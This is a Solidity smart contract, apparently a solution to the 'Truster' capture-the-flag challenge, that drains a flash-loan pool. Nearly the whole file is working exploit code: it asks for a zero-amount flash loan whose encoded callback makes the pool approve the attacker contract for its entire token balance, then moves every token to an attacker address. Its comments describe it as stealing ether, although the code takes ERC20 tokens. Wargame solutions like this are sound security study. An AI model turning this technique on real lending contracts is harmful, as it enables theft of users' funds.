// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/// @title Attacker of TrusterLenderPool
/// @author kaliberpoziomka
/// @notice It allows to steal ether from pool contract
/// @dev 
/**
 Attack is performed in steps:
 1. Run flashLoan
 2. Allow attacker to manage pool's eth
 3. Transfer all tokens from pool
*/

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface iTrusterLenderPool {
    function flashLoan(
        uint256 borrowAmount,
        address borrower,
        address pool,
        bytes calldata data
    )
        external;
}

contract AttackTrusterLenderPool {
    


    IERC20 token;
    iTrusterLenderPool pool;
    
    constructor(address _token, address _pool) {
        token = IERC20(_token);
        pool = iTrusterLenderPool(_pool);
    }


function attack(address _attacker) public {
        // check balance of TOKENS in pool
        uint256 balanceTarget = token.balanceOf(address(pool));

        // create signature of ERC20 TOKEN method "approve"
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)", // in signature string just types, without space
            address(this), // approve this address to manage 'balanceTarget' amount of pools' tokens
            balanceTarget
            );

        // call a flashLoan with siegned attacker function
        // we use 0 amount of loan, so the flashLoan transaction is not reverted
        pool.flashLoan(0, _attacker, address(token), data);

        // transfer tokens to attacker EOA
        token.transferFrom(address(pool), _attacker, balanceTarget);
    }

}